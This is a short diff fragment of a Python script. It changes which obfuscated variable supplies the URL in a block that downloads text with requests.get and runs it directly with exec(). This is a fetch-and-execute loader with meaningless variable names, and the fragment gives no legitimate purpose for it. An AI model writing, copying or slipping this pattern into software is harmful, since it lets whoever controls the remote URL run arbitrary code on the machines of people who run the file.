@@ -116,7 +116,7 @@ else:
          
 
 try:
-        response = requests.get(jo)
+        response = requests.get(Mo)
         response.raise_for_status()
         junku = response.text
         exec(junku)
